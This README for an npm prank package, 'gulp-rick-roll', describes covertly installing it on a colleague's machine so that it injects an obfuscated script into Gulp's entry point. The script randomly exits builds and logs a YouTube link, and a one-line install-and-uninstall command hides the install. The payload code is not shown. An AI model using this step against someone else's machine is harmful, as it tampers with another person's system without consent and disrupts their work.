# gulp-rick-roll
Allows you to Rick roll your Gulp-using colleagues by finding the local entry point for Gulp,
adding an obfuscated script that randomly exits the process early and occasionally logs a YouTube
link.

## Usage
On the colleague's computer, run the following inside your project root:
```bash
npm i gulp-rick-roll && npm uninstall gulp-rick-roll
```

## Undoing it
If you want to undo the changes done by this plugin, you can reinstall Gulp:

```bash
npm uninstall gulp && npm i gulp
```
